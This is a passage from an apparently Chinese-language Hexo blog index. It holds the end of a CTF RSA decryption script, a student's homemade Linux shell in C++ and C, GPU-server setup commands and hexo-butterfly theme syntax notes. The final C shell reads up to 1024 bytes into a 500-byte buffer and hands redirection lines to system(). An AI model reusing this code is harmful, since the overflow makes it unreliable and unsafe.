gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>取得flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux-shell的撰寫</title>
      <link href="/linux-shell/"/>
      <url>/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>分享一下去年修作業系統的時候寫出來的shell(最終成績97，因為做不到多重檔案重定向被扣了三分)，shell主要結構大概是這樣，沒記錯的話，這也是恐龍書裡面的架構，接下來要做的事情僅僅只是依據此架構進行延伸。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (TRUE)&#123;</span><br><span class="line">    <span class="built_in">type_prompt</span>();</span><br><span class="line">    <span class="built_in">read_command</span>(command, parameters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">execvp</span>(command, parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>將程式碼初步補充完之後，可以得到下面的架構，這部分是初步的完成品，也是我覺得很好的學習範例。</p><p>目前能夠執行基礎的指令，但不能實現pipe檢測和檔案重定向等功能。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type_prompt</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_command</span><span class="params">(<span class="type">char</span> *, <span class="type">char</span> **)</span></span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_LENGTH = <span class="number">256</span>;</span><br><span class="line">string local = <span class="string">&quot;~\\&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *command = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">  <span class="type">char</span> **parameters = <span class="keyword">new</span> <span class="type">char</span> *[MAX_LENGTH];</span><br><span class="line">  <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//進入畫面</span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Welcome to AfanShell&quot;</span> &lt;&lt; endl;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;ctrl-c or ctrl-\\ to quit&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (TRUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">type_prompt</span>();</span><br><span class="line">    <span class="built_in">read_command</span>(command, parameters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">execvp</span>(command, parameters);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type_prompt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;AfanShell@&quot;</span></span><br><span class="line">       &lt;&lt; <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_command</span><span class="params">(<span class="type">char</span> *command, <span class="type">char</span> **parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *tmp = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">  <span class="type">char</span> *token;</span><br><span class="line">  <span class="comment">// char *pipe = &quot;|&quot;; //檢測pipe功能啦</span></span><br><span class="line">  <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LENGTH; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    parameters[i] = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  cin.<span class="built_in">getline</span>(tmp, MAX_LENGTH - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  token = <span class="built_in">strtok</span>(tmp, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (token != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    parameters[count] = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">    <span class="built_in">strcpy</span>(parameters[count], token);</span><br><span class="line">    token = <span class="built_in">strtok</span>(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">if</span> (count == MAX_LENGTH - <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">    <span class="built_in">strcpy</span>(parameters[<span class="number">0</span>], <span class="string">&quot;echo&quot;</span>);</span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">    <span class="built_in">strcpy</span>(parameters[<span class="number">1</span>], <span class="string">&quot;No input received&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">strcpy</span>(command, parameters[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最終成果如下，將pipe補上，但要注意的是不可以做多重檔案重定向。</p><p>另外將程式碼改成c，雖然改動範圍不大就是了，希望對大家有幫助。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author Afan Chen. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *args[<span class="number">512</span>];</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> command_pipe[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execute</span><span class="params">(<span class="type">char</span> *cmd, <span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WaitChild</span><span class="params">(<span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">char</span> line[<span class="number">500</span>];</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">type_prompt</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_command</span><span class="params">(<span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello!\nThis is Afan@Shell\nctrl-c or ctrl-\\ to quit\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">type_prompt();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fgets(line, <span class="number">1024</span>, <span class="built_in">stdin</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line"><span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> first = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *cmd = line;</span><br><span class="line"><span class="type">char</span> *next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27;|&#x27;</span>); <span class="comment">/* 找第一個 &#x27;|&#x27; */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *file = <span class="string">&quot;&lt;&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strpbrk</span>(cmd, file) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">system(cmd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">*next = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">input = execute(cmd, input, first, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">cmd = next + <span class="number">1</span>;</span><br><span class="line">next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27;|&#x27;</span>); <span class="comment">/* 找其他的 &#x27;|&#x27; */</span></span><br><span class="line">first = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">input = execute(cmd, input, first, <span class="number">1</span>);</span><br><span class="line">WaitChild(n);</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">type_prompt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Afan@Shell:$ &quot;</span>);</span><br><span class="line">  fflush(<span class="literal">NULL</span>);<span class="comment">//清空緩衝區，把字串print出來</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_command</span><span class="params">(<span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> pipettes[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipettes);</span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (first == <span class="number">1</span> &amp;&amp; last == <span class="number">0</span> &amp;&amp; input == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dup2(pipettes[WRITE], STDOUT_FILENO);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (first == <span class="number">0</span> &amp;&amp; last == <span class="number">0</span> &amp;&amp; input != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dup2(input, STDIN_FILENO);</span><br><span class="line">dup2(pipettes[WRITE], STDOUT_FILENO);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">dup2(input, STDIN_FILENO);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (execvp(args[<span class="number">0</span>], args) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OOOOOOOh!It&#x27;s wrong.\n&quot;</span>);</span><br><span class="line">_exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input != <span class="number">0</span>)</span><br><span class="line">close(input);</span><br><span class="line"></span><br><span class="line">close(pipettes[WRITE]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last == <span class="number">1</span>)</span><br><span class="line">close(pipettes[READ]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pipettes[READ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WaitChild</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">SkipWhite</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">isspace</span>(*s))</span><br><span class="line">s++;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Split</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">cmd = SkipWhite(cmd);</span><br><span class="line"><span class="type">char</span> *next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">next[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">args[i] = cmd;</span><br><span class="line">i++;</span><br><span class="line">cmd = SkipWhite(next + <span class="number">1</span>);</span><br><span class="line">next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cmd[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">args[i] = cmd;</span><br><span class="line">next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">next[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">args[i] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execute</span><span class="params">(<span class="type">char</span> *cmd, <span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span></span><br><span class="line">&#123;</span><br><span class="line">Split(cmd);</span><br><span class="line"><span class="keyword">if</span> (args[<span class="number">0</span>] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">n += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> read_command(input, first, last);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 作業系統 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gpu server 架好之後的一些常用指令</title>
      <link href="/gpu-server-command/"/>
      <url>/gpu-server-command/</url>
      
        <content type="html"><![CDATA[<p>之前參加AI Cup的時候跟資工系的蘇木春教授借了一台GPU server來給組員遠端做使用，這是當時撰寫的一些簡單規範，從hackMD拿過來這邊放當備份。</p><h2 id="運行你的程式前請先做以下事項"><a class="markdownIt-Anchor" href="#運行你的程式前請先做以下事項"></a> !運行你的程式前，請先做以下事項</h2><p>查詢有沒有人在用gpu，使用率很高的話，請在跑的時候指定沒人用的gpu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><h2 id="一些會常用的指令"><a class="markdownIt-Anchor" href="#一些會常用的指令"></a> 一些會常用的指令</h2><h3 id="下載python"><a class="markdownIt-Anchor" href="#下載python"></a> 下載python</h3><p>工作站裡面沒有python3.8，只有到3.6，所以需要自己下載，步驟如下，一次請只輸入一條指令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install software-properties-common</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3.8</span><br></pre></td></tr></table></figure><p>成功安裝的話運行這個，理論上會出現Python 3.8.12</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.8 --version</span><br></pre></td></tr></table></figure><h3 id="傳送檔案"><a class="markdownIt-Anchor" href="#傳送檔案"></a> 傳送檔案</h3><p>要傳送檔案到工作站的話，ssh下可以使用以下指令，之後輸入一下密碼就好了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 要傳送的檔案 user@140.115.0.0:~/data(目的地)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 -r 要傳送的檔案目錄 user2@140.115.0.0:~/data(目的地)</span><br></pre></td></tr></table></figure><h3 id="安裝虛擬環境"><a class="markdownIt-Anchor" href="#安裝虛擬環境"></a> 安裝虛擬環境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">python3.8 -m virtualenv venv --python=python3.8</span><br></pre></td></tr></table></figure><h3 id="開啟虛擬環境"><a class="markdownIt-Anchor" href="#開啟虛擬環境"></a> 開啟虛擬環境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source ./venv/bin/activate</span><br></pre></td></tr></table></figure><h3 id="跑模型"><a class="markdownIt-Anchor" href="#跑模型"></a> 跑模型</h3><p>在yolov5底下開啟venv虛擬環境之後，輸入以下指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup python3.8 -m torch.distributed.launch --nproc_per_node 2 train.py --img 1280 --batch 16 --epochs 200 --data train.yaml --weights yolov5s.pt --device 0,1</span><br></pre></td></tr></table></figure><h3 id="離開ssh時讓模型繼續跑"><a class="markdownIt-Anchor" href="#離開ssh時讓模型繼續跑"></a> 離開ssh時讓模型繼續跑</h3><p>進入一個程序管理器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux</span><br></pre></td></tr></table></figure><p>接下來執行完跑模型的操作之後依序按下ctrl+b和d，就可以退出當前程式，並讓程式在背景運行</p><h3 id="下載模型"><a class="markdownIt-Anchor" href="#下載模型"></a> 下載模型</h3><p>訓練完的模型從伺服器裡面下載回來做使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -r -P 22 user@140.115.0.0:~/project/yolov5/runs/train/exp2 G:\project</span><br></pre></td></tr></table></figure><h3 id="下載解壓縮套件"><a class="markdownIt-Anchor" href="#下載解壓縮套件"></a> 下載解壓縮套件</h3><p>因為圖片太多了，基本上都是壓縮成一個檔案上傳，但伺服器端沒有解壓縮的套件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install zip</span><br></pre></td></tr></table></figure><p>之後就可以使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 檔案名稱</span><br></pre></td></tr></table></figure><p>來解壓縮到當前路徑</p><h3 id="建立資料夾"><a class="markdownIt-Anchor" href="#建立資料夾"></a> 建立資料夾</h3><p>如果要在本地和遠端都建立一個專案來跑的話，請先在遠端home/user?之下先建立檔案路徑，可以使用以下指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir 資料夾名稱</span><br></pre></td></tr></table></figure><h3 id="跑文本識別"><a class="markdownIt-Anchor" href="#跑文本識別"></a> 跑文本識別</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m paddle.distributed.launch --gpus &#x27;0,1&#x27;  tools/train.py -c configs/rec/rec_icdar15_train.yml</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo-theme-butterfly 常用語法</title>
      <link href="/set-hexo-theme/"/>
      <url>/set-hexo-theme/</url>
      
        <content type="html"><![CDATA[<p>給自己的一個備忘錄，一般的markdown語法就不提了。</p><p>主要想記錄我自己未來應該會用到的語法，之後寫作用。</p><p>轉載自https://butterfly.js.org/posts/dc584b87</p><h3 id="page-front-matter"><a class="markdownIt-Anchor" href="#page-front-matter"></a> Page Front-matter</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">comments:</span><br><span class="line">description:</span><br><span class="line">keywords:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">mathjax:</span></span><br><span class="line"><span class="emphasis">katex:</span></span><br><span class="line"><span class="emphasis">aside:</span></span><br><span class="line"><span class="emphasis">aplayer:</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>寫法解釋<br />title【必需】頁面標題<br />date【必需】頁面創建日期<br />type【必需】標籤、分類和友情鏈接三個頁面需要配置<br />updated【可選】頁面更新日期<br />description【可選】頁面描述<br />keywords【可選】頁面關鍵字<br />comments【可選】顯示頁面評論模塊(默認 true)<br />top_img【可選】頁面頂部圖片<br />mathjax【可選】顯示mathjax(當設置mathjax的per_page: false時，才需要配置，默認 false)<br />katex【可選】顯示katex(當設置katex的per_page: false時，才需要配置，默認 false)<br />aside【可選】顯示側邊欄 (默認 true)<br />aplayer【可選】在需要的頁面加載aplayer的js和css,請參考文章下面的音樂 配置<br />highlight_shrink【可選】配置代碼框是否展開(true/false)(默認為設置中highlight_shrink的配置)</p><h3 id="post-front-matter"><a class="markdownIt-Anchor" href="#post-front-matter"></a> Post Front-matter</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">comments:</span></span><br><span class="line"><span class="emphasis">cover:</span></span><br><span class="line"><span class="emphasis">toc:</span></span><br><span class="line"><span class="emphasis">toc_</span>number:</span><br><span class="line">toc<span class="emphasis">_style_</span>simple:</span><br><span class="line">copyright:</span><br><span class="line">copyright<span class="emphasis">_author:</span></span><br><span class="line"><span class="emphasis">copyright_</span>author<span class="emphasis">_href:</span></span><br><span class="line"><span class="emphasis">copyright_</span>url:</span><br><span class="line">copyright<span class="emphasis">_info:</span></span><br><span class="line"><span class="emphasis">mathjax:</span></span><br><span class="line"><span class="emphasis">katex:</span></span><br><span class="line"><span class="emphasis">aplayer:</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink:</span><br><span class="line"><span class="section">aside:</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>寫法解釋<br />title【必需】文章標題<br />date【必需】文章創建日期<br />updated【可選】文章更新日期<br />tags【可選】文章標籤<br />categories【可選】文章分類<br />keywords【可選】文章關鍵字<br />description【可選】文章描述<br />top_img【可選】文章頂部圖片<br />cover【可選】文章縮略圖(如果沒有設置top_img,文章頁頂部將顯示縮略圖，可設為false/圖片地址/留空)<br />comments【可選】顯示文章評論模塊(默認 true)<br />toc【可選】顯示文章TOC(默認為設置中toc的enable配置)<br />toc_number【可選】顯示toc_number(默認為設置中toc的number配置)<br />toc_style_simple【可選】顯示 toc 簡潔模式<br />copyright【可選】顯示文章版權模塊(默認為設置中post_copyright的enable配置)<br />copyright_author【可選】文章版權模塊的文章作者<br />copyright_author_href【可選】文章版權模塊的文章作者鏈接<br />copyright_url【可選】文章版權模塊的文章連結鏈接<br />copyright_info【可選】文章版權模塊的版權聲明文字<br />mathjax【可選】顯示mathjax(當設置mathjax的per_page: false時，才需要配置，默認 false)<br />katex【可選】顯示katex(當設置katex的per_page: false時，才需要配置，默認 false)<br />aplayer【可選】在需要的頁面加載aplayer的js和css,請參考文章下面的音樂 配置<br />highlight_shrink【可選】配置代碼框是否展開(true/false)(默認為設置中highlight_shrink的配置)<br />aside【可選】顯示側邊欄 (默認 true)</p><h3 id="gallery-相冊"><a class="markdownIt-Anchor" href="#gallery-相冊"></a> Gallery 相冊</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg" alt="" /></p>          </div><h3 id="圖表繪製"><a class="markdownIt-Anchor" href="#圖表繪製"></a> 圖表繪製</h3><p>使用mermaid標籤可以繪製Flowchart（流程圖）、Sequence diagram（時序圖 ）、Class Diagram（類別圖）、State Diagram（狀態圖）、Gantt（甘特圖）和Pie Chart（圓形圖），具體可以查看<a href="https://mermaid-js.github.io/mermaid/#/">mermaid文檔</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid %&#125;</span><br><span class="line">pie</span><br><span class="line">    title Key elements in Product X</span><br><span class="line">    &quot;Calcium&quot; : 42.96</span><br><span class="line">    &quot;Potassium&quot; : 50.05</span><br><span class="line">    &quot;Magnesium&quot; : 10.01</span><br><span class="line">    &quot;Iron&quot; :  5</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  pie    title Key elements in Product X    